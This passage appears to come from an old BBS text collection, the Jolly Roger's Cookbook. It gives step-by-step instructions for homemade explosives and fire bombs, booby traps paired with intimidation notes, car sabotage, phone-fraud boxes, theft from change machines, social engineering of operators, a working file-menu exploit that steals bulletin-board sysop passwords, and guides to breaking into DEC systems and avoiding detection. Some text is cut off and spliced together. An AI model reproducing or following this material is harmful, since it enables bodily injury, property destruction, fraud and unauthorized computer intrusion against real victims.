and set the limit for one thousand. Plug the other end of the cord
into the generator. Take the phone jack and splice the jack part off.
Open it up and match the red and green wires with
the other red and green wires. NOTE: If you just had the generator on
and have done this in the correct order, you will be a crispy critter.
Keep the generator off until you plan to start it up. Now, solder those
lines together carefully. Wrap duck tape or insultation tape around all
of the wires. Now, place the remote control right on to the startup
of the generator. If you have the long pole, make sure it is very long
and stand back as far away as you can get and reach the pole over.
NOTICE: If you are going right along with this without reading the file
first, you still realize now that your area code is about to become
null! Then, getting back, twitch the pole/remote control and run for your
damn life. Anywhere, just get away from it. It will be generating
so much electricity that if you stand to close you will kill yourself.
The generator will smoke, etc. but will not stop. You are now killing your
area code, because all of that energy is spreading through all of the
phone lines around you in every direction.

Have a nice day!

Brown Box Plans                                 by The Jolly Roger

This is a fairly simple mod that can be made to any phone. All it does 
is allow you to take any two lines in your house and create a party
line. So far I have not heard of anyone who has any problems
with it. There is one thing that you will notice when you are
one of the two people who is called by a person with a brown box. The other
person will sound a little bit faint. I could overcome this with some 
amplifiers but then there wouldn't be very many of these made [Why not?].
I think the convenience of having two people on the line at once will 
make up for any minor volume loss.

Calcium Carbide Bomb                            by The Jolly Roger

This is EXTREMELY DANGEROUS. Exercise extreme caution.... Obtain some
calcium carbide. This is the stuff that is used in carbide lamps and
can be found at nearly any hardware store. Take a few pieces of this
stuff (it looks like gravel) and put it in a glass jar with some
water. Put a lid on tightly. The carbide will react with the water to
produce acetylene carbonate which is similar to the gas used in
cutting torches. Eventually the glass with explode from internal
pressure. If you leave a burning rag nearby, you will get a nice
fireball!

More Ways to Send a Car to Hell                 by The Jolly Roger

Due to a lot of compliments, I have written an update to file #14.
I have left the original intact. This expands upon the original 
idea, and could be well called a sequal. -----MDN.

How to have phun with someone else's car.  If you really detest
someone, and I mean detest, here's a few tips on what to do in your
spare time.  Move the windshield wiper blades, and insert and glue
tacks.  The tacks make lovely designs.  If your "friend" goes to
school with you, Just before he comes out of school.  Light a lighter
and then put it directly underneath his car door handle.
Wait...Leave...Listen.  When you hear a loud "shit!", you know he
made it to his car in time.  Remove his muffler and pour approximately
1 Cup of gas in it. Put the muffler back, then wait till their car starts.
Then you have a cigarette lighter.  A 30 foot long cigarette lighter.
This one is effective, and any fool can do it.  Remove the top
air filter. That's it!  Or a oldie but goodie: sugar in the gas tank.
Stuff rags soaked in gas up the exhaust pipe.  Then you wonder why
your "friend" has trouble with his/her lungs.  Here's one that takes
time and many friends.  Take his/her car then break into their house
and reassemble it, in their living or bedroom.  Phun eh?  If you're
into engines, say eeni mine moe and point to something and remove it.
They wonder why something doesn't work. There are so many others, but
the real good juicy ones come by thinking hard.

Ripping off Change Machines                     by the Jolly Roger

Have you ever seen one of those really big changer machines in airports
laundrymats or arcades that dispense change when you put in your 1 or 5
dollar bill?  Well then, here is an article for you.

1)  Find the type of change machine that you slide in your bill length
wise, not the type where you put the bill in a tray and then slide the 
tray in!!!
2)  After finding the right machine, get a $1 or $5 bill.  Start crumpling
up into a ball.  Then smooth out the bill, now it should have a very wrinkly
surface.
3) Now the hard part.  You must tear a notch in the bill on the
left side about 1/2 inch below the little 1 dollar symbol (See Figure).
4) If you have done all of this right then take the bill and go out the
machine.  Put the bill in the machine and wait.  What should happen is:
when you put your bill in the machine it thinks everything is fine. 
When it gets to the part of the bill with the notch cut out, the
machine will reject the bill and (if you have done it right)
give you the change at the same time!!! So, you end up getting your bill
back, plus the change!!  It might take a little practice, but once
you get the hang of it, you can get a lot of money!

Clear Box Plans                                 by The Jolly Roger

The clear box is a new device which has just been invented that can be
used throughout Canada and rural United States. The clear box works on
"PostPay" payphones (fortress fones). Those are the payphones
that don't require payment until after the connection is established.
You pick up the fone, get a dial tone, dial your number, and then
insert your money after the person answers.
If you don't deposit the money then you can not speak to the person on
the other end because your mouth piece is cut off but not the ear-piece.
(obviously these phones are nice for free calls to weather or time or
other such recordings). All you must do is to go to your nearby Radio
Shack, or electronics store, and get a four-transistor amplifier and a
telephone suction cup induction pick-up. The induction pick-up would be
hooked up as it normally would to record a conversation, except
that it would be plugged into the output of the amplifier and a
microphone would be hooked to the input. So when the party
that is being called answers, the caller could speak through the little
microphone instead. His voice then goes through the amplifier and out
the induction coil, and into the back of the receiver where
it would then be broadcast through the phone lines and the other 
partywould be able to hear the caller. The Clear Box thus
'clears up' the problem of not being heard. Luckily, the line will
not be cut-off after a certain amount of time because it will wait
forever for the coins to be put in.
The biggest advantage for all of us about this new clear box is the
fact that this type of payphone will most likely become very common.
Due to a few things: 1st, it is a cheap way of getting the DTF,
dial-tone-first service, 2nd, it doesn't require any special equipment,
(for the phone company) This payphone will work on any phone line.
Usually a payphone line is different, but this is a regular phone line
and it is set up so the phone does all the charging, not the company.

Electronic Terrorism                            by The Jolly Roger

It starts when a big, dumb lummox rudely insults you.  Being of a
rational, intelligent disposition, you wisely choose to avoid a
(direct) confrontation.  But as he laughs in your face, you smile
inwardly---your revenge is already planned.
Step 1:  follow your victim to his locker, car, or house.  Once you
have chosen your target site, lay low for a week or more,
letting your anger boil.
Step 2:  in the mean time, assemble your versatile terrorist
kit(details below.)
Step 3:  plant your kit at the designated target site on a monday
morning between the hours of 4:00 am and 6:00 am.  Include a
calm, suggestive note that quietly hints at the possibility
of another attack.  Do not write it by hand!  An example of
an effective note:
  "don't be such a jerk, or the next one will take off your
   hand.  Have a nice day."
Notice how the calm tone instills fear.  As if written by a
homicidal psychopath.
Step 5:  choose a strategic location overlooking the target site.  Try
to position yourself in such a way that you can see his facial contortions.
Step 6:  sit back and enjoy the fireworks! Assembly of the versatile,
economic, and effective terrorist kit #1: the parts you'll need are:
1) 4 aa batteries
2) 1 9-volt battery
3) 1 spdt mini relay (radio shack)
4) 1 rocket engine(smoke bomb or m-80)
5) 1 solar ignitor (any hobby store)
6) 1 9-volt battery connector


Step 1:  take the 9-volt battery and wire it through the relay's coil.
This circuit should also include a pair of contacts that when
separated cut off this circuit.  These contacts should be held together
by trapping them between the locker,mailbox, or car door.
Once the door is opened, the contacts fall apart and the 9-volt circuit
is broken, allowing the relay to fall to the closed postion
thus closing the ignition circuit. (If all this is confusing take a
look at the schematic below.)

Step 2:  take the 4 aa batteries and wire them in succession.
Wire the positive terminal of one to the negative terminal of another,
until all four are connected except one positive terminal and one negative
terminal.  Even though the four aa batteries only combine to create 6
volts, the increase in amperage is necessary to activate the solar
ignitor quickly and effectively.

Step 3:  take the battery pack (made in step 2) and wire one end of it
to the relay's single pole and the other end to one prong of the solar
ignitor.  Then wire the other prong of the solar ignitor back to the open
position on the relay.

Step 4:  using double sided carpet tape mount the kit in his locker,
mailbox, or car door. And last, insert the solar ignitor into the
rocket engine (smoke bomb or m-80).



Your kit is now complete!

How to Start A Conference w/o 2600hz or M-F         by The Jolly Roger
     
        (Originally an Apple ][ file, forgive the upper case!)

THIS METHOD OF STARTING THE CONF. DEPENDS ON YOUR ABILITY TO BULLSHIT THE
OPERATOR INTO DIALING A NUMBER WHICH CAN ONLY BE REACHED WITH AN OPERATOR'S
M-F TONES.  WHEN BULLSHITTING THE OPERATOR REMEMBER OPERATOR'S ARE NOT
HIRED TO THINK BUT TO DO.

HERE IS A STEP-BY-STEP WAY TO THE CONF.:
1. CALL THE OPERATOR THROUGH A PBX OR EXTENDER, YOU COULD JUST CALL ONE
THROUGH YOUR LINE BUT I WOULDN'T RECOMMEND IT.
2. SAY TO THE OPERATOR:
TSPS MAINTENENCE ENGINEER, RING-FORWARD TO 213+080+1100, POSITION RELEASE,
THANKYOU.
(SHE WILL PROBABLY ASK YOU FOR THE NUMBER AGAIN)

DEFINITIONS: RING-FORWARD - INSTRUCTS HER TO DIAL THE NUMBER.
POSITION RELEASE - INSTUCTS HER TO RELEASE THE TRUNK AFTER SHE HAS
DIALED THE NUMBER.
+ - REMBER TO SAY 213PLUS080 PLUS1100.
3. WHEN YOU ARE CONNECTED WITH THE CONF. YOU WILL HERE A WHISTLE BLOW
TWICE AND A RECORDING ASKING YOU FOR YOUR OPERATOR #. DIAL IN ANY FIVE
DIGITS AND HIT THE POUNDS SIGN A COUPLE OF TIMES. SIMPLY DIAL IN THE #
OF THE BILLING LINE ECT. WHEN THE RECORDING ASK FOR IT.
3. WHEN IN THE CONTROL MODE OF THE CONF. HIT '6' TO TRANSFER CONTROL.
HIT '001' TO REENTER THE # OF CONFEREE'S AND TIME AMOUNT WHICH YOU
GAVE WHEN YOU STARED THE CONF. REMEMBER THE SIZE CAN BE FROM
2-59 CONFEREE'S. I HAVE NOT FOUND OUT THE 'LENGTHS' LIMITS.




How to Make Dynamite                            by The Jolly Roger

Dynamite is nothing more than just nitroglycerin and a stablizing
agent to make it much safer to use.  For the sake of saving time, I
will abbreviate nitroglycerin with a plain NG.  The numbers

experiment for school.

Auto Exhaust Flame Thrower                      by The Jolly Roger

For this one, all you need is a car, a sparkplug, ignition wire and a
switch. Install the spark plug into the last four or five inches of
the tailpipeby drilling a hole that the plug can screw into easily.
Attach the wire (this is regular insulated wire) to one side of the
switch and to the spark plug. The other side of the switch is attached
to the positive terminal on the battery. With the car running, simply
hit the switch and watch the flames fly!!! Again be careful that no
one is behind you! I have seen some of these flames go 20 feet!!!

Breaking into BBS Express              Courtesy of the Jolly Roger

If you have high enough access on any BBS Express BBS you can get the
Sysop's password without any problems and be able to log on as him and do
whatever you like. Download the Pass file, delete the whole BBS, anything.
Its all a matter of uploading a text file and d/ling it from the BBS. You
must have high enough access to see new uploads to do this. If you can see
a file you just uploaded you have the ability to break into the BBS in a
few easy steps.
Why am I telling everyone this when I run BBS Express myself?
Well there is one way to stop this from happening and I want other Sysops
to be aware of it and not have it happen to them.
Breaking in is all based on the MENU function of BBS Express. Express
will let you create a menu to display different text files by putting the
word MENU at the top of any text file and stating what files are to be
displayed. But due to a major screw up by Mr. Ledbetter you can use this
MENU option to display the USERLOG and the Sysop's Passwords or anything
else you like. I will show you how to get the Sysop's pass and therefore
log on as the Sysop. BBs Express Sysop's have 2 passwords. One like
everyone else gets in the form of X1XXX, and a Secondary password
to make it harder to hack out the Sysops pass.
The Secondary pass is found in a file called SYSDATA.DAT.
This file must be on drive 1 and is therefore easy to get. All you have to
do is upload this simple Text file:

MENU
1
D1:SYSDATA.DAT

Ripoff time!

after you upload this file you d/l it non-Xmodem. Stupid Express thinks
it is displaying a menu and you will see this:

Ripoff time!

Selection [0]:

Just hit 1 and Express will display the SYSDATA.DAT file.OPPASS is where
the Sysop's Secondary pass will be. D1:USERLOG.DAT is where you will find
the name and Drive number of the USERLOG.DAT file. The Sysop might have
renamed this file or put it in a Subdirectory or even on a different
drive. I Will Assume he left it as D1:USERLOG.DAT. The other parts of this
file tell you where the .HLP screens are and where the LOG is saved and
all the Download path names.

Now to get the Sysop's primary pass you upload a text file like this:

MENU
1
D1:USERLOG.DAT

Breaking into Bedwetter's BBS

Again you then d/l this file non-Xmodem and you will see:

Breaking into Bedwetter's BBS

Selection [0]:

You then hit 1 and the long USERLOG.DAT file comes flying at you.
The Sysop is the first entry in this very long file so it is easy. You will
see:

SYSOP'S NAME        X1XXX
You should now have his 2 passwords.

There is only one easy way out of this that I can think of, and that is
to make all new uploads go to SYSOP level (Level 9) access only. This way
nobody can pull off what I just explained.
I feel this is a major Bug on Mr. Ledbetter's part. I just don't know why
no one had thought of it before. I would like to give credit to 
Redline for the message he left on Modem Hell telling about this problem,
and also to Unka for his ideas and input about correcting it.

This has been brought to you from [_The_Piper_] and the S.O.D. BBS
Network!

Fuse Ignition Bomb                              by The Jolly Roger

A four strand homemade fuse is used for this. It burns like fury.
It is held down and concealed by a strip of bent tin cut from a can.
The exposed end of the fuse is dipped into the flare igniter. To use
this one, you light the fuse and hold the fire bomb until the fuse has
burned out of sight under the tin. Then throw it and when it breaks,
the burning fuse will ignite the contents.

Green Box Plans                                 by the Jolly Roger

Paying the initial rate in order to use a red box (on certain 
fortresses) left a sour taste in many red boxers mouths, thus the 
green box was invented. The green box generates useful tones such as
COIN COLLECT, COIN RETURN, AND RINGBACK. These are the tones that
ACTS or the TSPS operator would send to the CO when appropriate.
Unfortunately, the green box cannot be used at the fortress station but
must be used by the CALLED party.

Here are the tones:
COIN COLLECT     700+1100hz
COIN RETURN      1100+1700hz
RINGBACK         700+1700hz

Before the called party sends any of these tones, an operator realease
signal should be sent to alert the MF detectors at the CO.
This can be done by sending 900hz + 1500hz or a single 2600 wink (90 ms.)
Also do not forget that the initial rate is collected shortly before the
3 minute period is up. Incidentally, once the above MF 
tones for collecting and returning coins reach the CO, they are 
converted into an appropriate DC pulse (-130 volts for return and
+130 for collect). This pulse is then sent down the tip to the 
fortress. This causes the coin relay to either return or collect the coins.
The alledged "T-network" takes advantage of this information.
When a pulse for coin collect (+130 VDC) is sent down the line,
it must be grounded somewhere. This is usually the yellow or black wire.
Thus, if the wires are exposed, these wires can be cut to prevent
the pulse from being grounded. When the three minute initial
period is almost up, make sure that the black and yellow wires are
severed, then hang up, wait about 15 seconds in case of a second
pulse, reconnect the wires, pick up the phone, and if all goes well,
it should be "JACKPOT" time.

Portable Grenade Launcher                       by the Jolly Roger

If you have a bow, this one is for you. Remove the ferrule from an
aluminum arrow, and fill the arrow with black powder (I use grade
FFFF, it burns easy)and then glue a shotshell primer into the hole
left where the ferrule went. Next, glue a BB on the primer, and you
are ready to go! Make sure no one is nearby.... Little shreds of
aluminum go all over the place!!

Hacking Tutorial                       Courtesy of the Jolly Roger

What is hacking?
----------------
According to popular belief the term hacker and hacking was founded at mit
it comes from the root of a hack writer,someone who keeps "hacking" at
the typewriter until he finishes the story.a computer hacker would be
hacking at the keyboard or password works.

What you need:
--------------
To hack you need a computer equipped with a modem (a device that lets you
transmit data over phone lines) which should cost you from $100 to $1200.

How do you hack?
----------------
Hacking recuires two things:
1. The phone number
2. Answer to identity elements

How do you find the phone #?
----------------------------
There are three basic ways to find a computers phone number.
1. Scanning,
2. Directory
3. Inside info.

What is scanning?
-----------------
Scanning is the process of having a computer search for a carrier tone.
For example,the computer would start at (800) 111-1111 and wait for carrier
if there is none it will go on to 111-1112 etc.if there is a carrier it
will record it for future use and continue looking for more.

What is directory assictance?
-----------------------------
This way can only be used if you know where your target computer is. For this
example say it is in menlo park, CA and the company name is sri.

1. Dial 411 (or 415-555-1212)
2. Say "Menlo park"
3. Say "Sri"
4. Write down number
5. Ask if there are any more numbers
6. If so write them down.
7. Hang up on operator
8. Dial all numbers you were given
9. Listen fir carrier tone
10. If you hear carrier tone write down number, call it on your modem and your
    set to hack!

The Basics of Hacking II               Courtesy of the Jolly Roger

Basics to know before doing anything, essential to your continuing
career as one of the elite in the country...  This article, "the
introduction to the world of hacking" is meant to help you by telling you
how not to get caught, what not to do on a computer system, what type of
equipment should I know about now, and just a little on the history, past
present future, of the hacker.

Welcome to the world of hacking! We, the people who live outside of the
normal rules, and have been scorned and even arrested by those from the
'civilized world', are becomming scarcer every day.  This is due to the
greater fear of what a good hacker (skill wise, no moral judgements
here)|can do nowadays, thus causing anti- hacker sentiment in the masses.
Also, few hackers seem to actually know about the computer systems they
hack, or what equipment they will run into on the front end, or what they
could do wrong on a system to alert the 'higher' authorities who monitor
the system. This article is intended to tell you about some things not to
do, even before you get on the system.  I will tell you about the new wave
of front end security devices that are beginning to be used on computers.
I will attempt to instill in you a second identity, to be brought up at
time of great need, to pull you out of trouble. And, by the way, I take no, repeat,
no, responcibility for what we say in this and the forthcoming articles.
Enough of the bullshit, on to the fun: after logging on your favorite bbs,
you see on the high access board a phone number!  It says it's a great
system to "fuck around with!" This may be true, but how many other people
are going to call the same number?  So:  try to avoid calling a number
given to the public. This is because there are at least every other
user calling, and how many other boards will that number spread to?
If you call a number far, far away, and you plan on going thru an
extender or a re-seller, don't keep calling the same access number
(I.E. As you would if you had a hacker running), this looks very suspicious
and can make life miserable when the phone bill comes in the mail.
Most cities have a variety of access numbers and services,
so use as many as you can. Never trust a change in the system...
The 414's, the assholes, were caught for this reason: when one of them
connected to the system, there was nothing good there.  The next time,
there was a trek game stuck right in their way!  They proceded to play said
game for two, say two and a half hours, while telenet was tracing them!
Nice job, don't you think?  If anything looks suspicious, drop the line
immediately!!  As in, yesterday!! The point we're trying to get accross is:
if you use a little common sence, you won't get busted.  Let the little
kids who aren't smart enough to recognize a trap get busted, it will take
the heat off of the real hackers. Now, let's say you get on a computer
system...  It looks great, checks out, everything seems fine.
Ok, now is when it gets more dangerous.  You have to know the computer
system to know what not to do. 
Basically, keep away from any command something, copy a new file into the
account, or whatever!  Always leave the account in the same status you
logged in with.  Change *nothing*... If it isn't an account with priv's,
then don't try any commands that require them! All, yes all, systems are
going to be keeping log files of what users are doing, and that will
show up.  It is just like dropping a trouble-card in an ESS system,
after sending that nice operator a pretty tone.
Spend no excessive amounts of time on the account in one stretch.
Keep your calling to the very late night ifpossible, or during
business hours (believe it or not!).  It so happens
that there are more users on during business hours, and it is very
difficult to read a log file with 60 users doing many commnds every minute.
Try to avoid systems where everyone knows each other, don't try to bluff.
And above all:  never act like you own the system, or are the best there
is. They always grab the people who's heads swell... There is some very
interesting front end equipment around nowadays, but first let's
define terms... By front end, we mean any device that you must
pass thru to get at the real computer. There are devices that are made to
defeat hacker programs, and just plain old multiplexers.
To defeat hacker programs, there are now devices that pick up the phone
and just sit there...  This means that your device gets no carrier,
thus you think there isn't a computer on the other end.  The
only way around it is to detect when it was picked up.  If it pickes up
after the same number ring, then you know it is a hacker-defeater.
These devices take a multi-digit code to let you into the system.
Some are, in fact, quite sophisticated to the point where it
will also limit the user name's down, so only one name or set of names
can be valid logins after they input the code... Other devices input a
number code, and then they dial back a pre-programmed number for that code.
These systems are best to leave alone,
because they know someone is playing with their phone.  You may think "but
i'll just reprogram the dial-back." Think again, how stupid that is...
Then they have your number, or a test loop if you were just a little
smarter. If it's your number, they have your balls (if male...),
If its a loop, then you are screwed again, since those loops
are *monitored*. As for multiplexers...  What a plexer is supposed
to do is this:
The system can accept multiple users. We have to time share, so we'll let
the front-end processor do it...  Well, this is what a multiplexer does.
Usually they will ask for something like "enter class" or "line:".  Usually
it is programmed for a double digit number, or a four to five letter word.
There are usually a few sets of numbers it accepts, but those numbers also
set your 300/1200/2400 baud data type.
These multiplexers are inconvenient at best, so not to worry. A little
about the history of hacking: hacking, by my definition, means a great
knowledge of some special area. Doctors and lawyers
are hackers of a sort, by this definition.  But most often, it is
being used in the computer context, and thus we have a definition of
"anyone who has a great amount of computer or telecommunications
knowledge."  You are not a hacker because you have a list of codes...
Hacking, by my definition, has then been around only about 15 years.
It started, where else but, mit and colleges where they had computer
science or electrical engineering departments.
Hackers have created some of the best computer languages, the
most awesome operating systems, and even gone on to make millions.
Hacking used to have a good name, when we could honestly say
"we know what we are doing".  Now it means (in the public eye):
the 414's, ron austin, the nasa hackers, the arpanet hackers...
All the people who have been caught,
have done damage, and are now going to have to face fines and sentences.
Thus we come past the moralistic crap, and to our purpose:  educate the
hacker community, return to the days when people actually knew something...

Hacking DEC's                                 by the Jolly Roger

In this article you will learn how to log in to dec's, logging out, and all
the fun stuff to do in-between.  All of this information is based on a
standard dec system.
Since there are dec systems 10 and 20, and I favor, the dec 20,
there will be more info on them in this article.  It just so happens
that the dec 20 is also the more common of the two, and is used by much
more interesting people (if you know what I mean...) Ok, the first thing
you want to do when you are receiving carrier from a dec system is to find
out the format of login names.  You can do this by looking at who is on the
system.
Dec=> `  (the 'exec' level prompt)
you=> sy
sy is short for sy(stat) and shows you the system status.
You should see the format of login names...
A systat usually comes up in this form:
job  line  program  user
job:  the job number (not important unless you want to log them off later)
line:  what line they are on (used to talk to them...)
These are both two or three digit numbers.
Program:  what program are they running under?  If it says 'exec'
they aren't doing anything at all...
User:  ahhhahhhh!  This is the user name they are logged in under...
Copy the format, and hack yourself outa working code... Login format is as
such:
dec=> `
you=> login username password
username is the username in the format you saw above in the systat.
After you hit the space after your username, it will stop echoing
characters back to your screen.  This is the password you are typing in...
Remember, people  usually use their name, their dog's name, the name of a
favorite character in a book, or something like this. A few clever
people have it set to a key cluster (qwerty or asdfg).  Pw's can be from 1
to 8 characters long, anything after that is ignored. You are finally in...
It would be nice to have a little help, wouldn't it?  Just type a ? Or the
word help, and it will give you a whole list of topics...
Some handy characters for you to know would be the control keys,
wouldn't it? Backspace on a dec 20 is rub which is 255 on your ascii chart.
On the dec 10 it is cntrl-h. To abort a long listing or a program,
cntrl-c works fine.  Use cntrl-o to stop long output to the terminal.
This is handy when playing a game, but you don't want to cntrl-c out.
Cntrl-t for the time. Cntrl-u will kill the whole line you are typing at
the moment.  You may accidently run a program where the only way out is
a cntrl-x, so keep that in reserve. Cntrl-s to stop listing, cntrl-q to
continue on both systems. Is your terminal having trouble??
Like, it pauses for no reason, or it doesn't backspace right?  This is
because both systems support many terminals, and you haven't told it what
yours is yet... You are using a vt05
so you need to tell it you are one.
Dec=> `
you=> information terminal
or...
You=> info
this shows you what your terminal is set up as...
Dec=>all sorts of shit, then the `
you=> set ter vt05 this sets your terminal
type to vt05.
Now let's see what is in the account (here after abbreviated acct.)
that you have hacked onto... Say
=> dir
short for directory, it shows
you what the user of the code has save to the disk.  There should be a format
like this:    xxxxx.Oooxxxxx is the file name, from 1 to 20 characters
long.  Ooo is the file type, one of: exe, txt, dat, bas, cmd   and a few
others that are system dependant.
Exe is a compiled program that can be run (just by typing its name at the `).
Txt is a text file, which you can see by
typing=>
type xxxxx.Txt
Do not try to=>
type xxxxx.Exe this is very bad for your terminal and will tell you
absolutly nothing.
Dat is data they have saved.
Bas is a basic program, you can have it typed out for you.
Cmd is a command type file, a little too
complicated to go into here.
Try =>
take xxxxx.Cmd
By the way, there are other users out there who may have files you can use
(gee, why else am I here?).
Type => dir <*.*> (Dec 20)
     => dir [*,*]   (dec 10)
* is a wildcard, and will allow you to access the files on other accounts
if the user has it set for public access. If it isn't set for public access,
then you won't see it. To run that program:
dec=> `
you=> username program-name
username is the directory you saw the
file listed under, and file name was
what else but the file name?
**  You are not alone  **
remember, you said (at the very start) sy  short for systat,
and how we said this showed the other users on the system?  Well, you
can talk to them, or at least send a message to anyone you see listed in a
systat.  You can do this by:
dec=> the user list (from your systat)
you=> talkusername (dec 20)
      send username (dec 10)
talk allows you and them immediate transmission of whatever you/they type
to be sent to the other.  Send only allow you one message to be sent, and
send, they will send back to you, with talk you can just keep going. By the
way, you may be noticing with the talk command that what you type is still
acted upon by the parser (control program).  To avoid the constant error
messages type either:
you=>  ;your message
you=>  rem your message
the semi-colon tells the parser that what follows is just a comment.  Rem
is short for 'remark' and ignores you from then on until you type a cntrl-z
or cntrl-c, at which point it puts you back in the exec mode. To break the
connection from a talk command type:
you=>  break priv's:
if you happen to have privs, you can do all sorts of things. 
First of all, you have to activate those privs.
You=> enable
this gives you a $ prompt, and allows you to do this:
whatever you can do to your own directory you can now do to any
other directory. To create a new acct. Using your privs, just type
=>build username
if username is old, you can edit it, if it is new, you can
define it to be whatever you wish. Privacy means nothing to a user with
privs.  By the way, there are various levels of privs:  operator, wheel,
cia.
wheel is the most powerful, being that he can log in from anywhere and
have his powers.
Operators have their power because they are at a special terminal
allowing them the privs.  Cia is short for 'confidential information
access', which allows you a low level amount of privs. 
Not to worry though, since you can read the system log file, which also
has the passwords to all the other accounts.
To de-activate your privs, type
you=> disable
when you have played your greedy heart out, you can finally leave the
system with the command=>
logout
this logs the job you are using off the system (there may be varients
of this such as kjob, or killjob).

Harmless Bombs                                  by the Jolly Roger

To all those who do not wish to inflict bodily damage on their victims
but only terror.
These are weapons that should be used from high places.
1) The flour bomb.
Take a wet paper towel and pour a given amount of baking flour in
the center. Then wrap it up and put on a rubber band to keep it
together. When thrown it will fly well but when it hits, it covers
the victim with the flower or causes a big puff of flour which will
put the victim in terror since as far as they are concerned, some
strange white powder is all over them. This is a cheap method of
terror and for only the cost of a roll of paper towels and a bag of
flour you and your friends can have loads of fun watching people
flee in panic.
2) Smoke bomb projectile.
All you need is a bunch of those little round smoke bombs and a
wrist rocket or any sling-shot. Shoot the smoke bombs and watch the
terror since they think it will blow up!
3) Rotten eggs (good ones)
Take some eggs and get a sharp needle
and poke a small hole in the top of each one.
Then let them sit in a warm place for about a week. Then you've got a
bunch of rotten eggs that will only smell when they hit.
4) Glow in the dark terror.
Take one of those tubes of glow in the dark stuff and pour the
stuff on whatever you want to throw and when it gets on the victim,
they think it's some deadly chemical or a radioactive substance so
they run in total panic. This works especially well with flower
bombs since a gummy, glowing substance gets all over the victim.
5) Fizzling panic.
Take a baggie of a water-baking soda solution and seal it. (Make
sure there is no air in it since the solution will form a gas and
you don't want it to pop on you.) Then put it in a bigger plastic
bag and fill it with vinegar and seal it. When thrown, the two
substances will mix and cause a violently bubbling substance to go
all over the victim.

A Guide to Hypnotism                     Courtesy of the Jolly Roger
      (Originally an Apple ][ file, forgive the uppercase!)

+-------------------+
! WHAT HYPNOTISM IS !
+-------------------+

HYPNOTISM, CONTRARY TO COMMON BELEIF, IS MERELY STATE WHEN YOUR MIND AND
BODY ARE IN A STATE OF RELAXATION AND YOUR MIND IS OPEN TO POSITIVE, OR
CLEVERLY WORDED NEGATIVE, INFLUENCES.  IT IS NOT A TRANCE WHERE YOU:
                  > ARE TOTALLY INFLUENCABLE.
                  > CANNOT LIE.
                  > A SLEEP WHICH YOU CANNOT WAKE UP FROM
                    WITHOUT HELP.
THIS MAY BRING DOWN YOUR HOPE SOMEWHAT, BUT, HYPNOTISM IS A POWERFUL FOR
SELF HELP, AND/OR MISCHEIF.

+-----------------------+
! YOUR SUBCONCIOUS MIND !
+-----------------------+

BEFORE GOING IN FURTHER, I'D LIKE TO STATE THAT HYPNOTISM NOT ONLY IS
GREAT IN THE WAY THAT IT RELAXES YOU AND GETS YOU (IN THE LONG RUN) WHAT
YOU WANT, BUT ALSO THAT IT TAPS A FORCE OF INCREDIBLE POWER, BELEIVE IT OR
NOT, THIS POWER IS YOUR SUBCONCIOUS MIND.
THE SUBCONCIOUS MIND ALWAYS KNOWS WHAT IS GOING ON WITH EVERY PART OF YOUR BODY,
EVERY MOMENT OF THE DAY.  IT PROTECTS YOU FROM NEGATIVE INFLUENCES,
AND RETAINS THE POWER TO SLOW YOUR HEARTBEAT DOWN AND STUFF LIKE THAT.
THE SUBCONCIOUS MIND HOLDS JUST ABOUT ALL THE INFO YOU WOULD LIKE TO KNOW
ABOUT YOURSELF, OR, IN THIS CASE, THE PERSON YOU WILL BE HYPNOTISING.
THERE ARE MANY WAYS TO TALK TO YOUR SUBCONCIOUS AND HAVE IT TALK BACK TO
YOU. ONE WAY IS THE OUJA BOARD, NO ITS NOT A SPIRIT, MERELY THE
MINDS OF THOSE WHO ARE USING IT.  ANOTHER, WHICH I WILL DISCUSS HERE,
IS THE PENDULUM METHOD.  OK, HERE IS HOW IT GOES.
FIRST, GET A RING OR A WASHER AND TIE IT TO A THREAD A LITTLE LONGER THAN
HALF OF YOUR FOREARM.  NOW, TAKE A SHEET OF PAPER AND DRAW A BIG CIRCLE IN
IT.  IN THE BIG CIRCLE YOU MUST NOW DRAW A CROSSHAIR (A BIG +).  NOW, PUT
THE SHEET OF PAPER ON A TABLE.  NEXT, HOLD THE THREAD WITH THE RING OR
WASHER ON IT AND PLACE IT (HOLDING THE THREAD SO THAT THE RING IS 1 INCH
ABOVE THE PAPER SWINGING) IN THE MIDDLE OF THE CROSSHAIR.  NOW, SWING
THE THREAD SO THE WASHER GOES UP AND DOWN, SAY TO YOURSELF THE WORD "YES"
NOW, DO IT SIDE TO SIDE AND SAY THE WORD "NO".
DO IT COUNTER CLOCKWISE AND SAY "I DON'T KNOW".
AND LASTLY, DO IT CLOCKWISE AND SAY "I DONT WANT TO SAY." NOW, WITH THE
THREAD BACK IN THE MIDDLE OF THE CROSSHAIR, ASK YOURSELF QUESTIONS AND
WAIT FOR THE PENDULUM TO SWING IN THE DIRECTION FOR THE ANSWER. (YES, NO,
I DONT KNOW OR I DONT WANNA SAY...). SOON, TO YOUR AMAZEMENT, IT WILL BE
ANSWERING QUESTIONS LIKE ANYTHING... LET THE PENDULUM ANSWER, DONT TRY..
WHEN YOU TRY YOU WILL NEVER GET AN ANSWER.  LET THE ANSWER COME TO YOU.

+-------------------------+
! HOW TO INDUCE HYPNOTISM !
+-------------------------+

NOW THAT YOU KNOW HOW TO TALK TO YOUR SUBCONCIOUS MIND, I WILL NOW TELL YOU
HOW TO GUIDE SOMEONE INTO HYPNOSIS. NOTE THAT I SAID GUIDE, YOU CAN NEVER,
HYNOTISE SOMEONE, THEY MUST BE WILLING. OK, THE SUBJECT MUST BE LYING OR
SITTING IN A COMFORTABLE POSITION, RELAXED, AND AT A TIME WHEN THINGS ARENT
GOING TO BE INTERRUPTED.
TELL THEM THE FOLLOWING OR SOMETHING CLOSE TO IT, IN A PEACEFUL, MONOTINOUS
TONE (NOT A COMMANDING TONE OF VOICE)

NOTE:  LIGHT A CANDLE AND PLACE IT SOMEWHERE WHERE IT CAN BE EASILY SEEN.

TAKE A DEEP BREATH THROUGH YOUR NOSE AND HOLD IT IN FOR A COUNT OF 8. NOW,
THROUGH YOUR MOUTH, EXHALE COMPLETELY AND SLOWLY. CONTINUED BREATHING LONG,
DEEP, BREATHS THROUGH YOUR NOSE AND EXHALING THROUGH YOUR MOUTH.  TENSE UP
ALL YOUR MUSCLES VERY TIGHT, NOW, COUNTING FROM TEN TO ONE, RELEASE THEM
SLOWLY, YOU WILL FIND THEM VERY RELAXED.  NOW, LOOK AT THE CANDLE, AS
YOU LOOK AT IT, WITH EVERY BREATH AND PASSING MOMEMENT, YOU ARE FEELING
INCREASINGLY MORE AND MORE PEACEFUL AND RELAXED.  THE CANDLES FLAME IS
PEACEFUL AND BRIGHT.
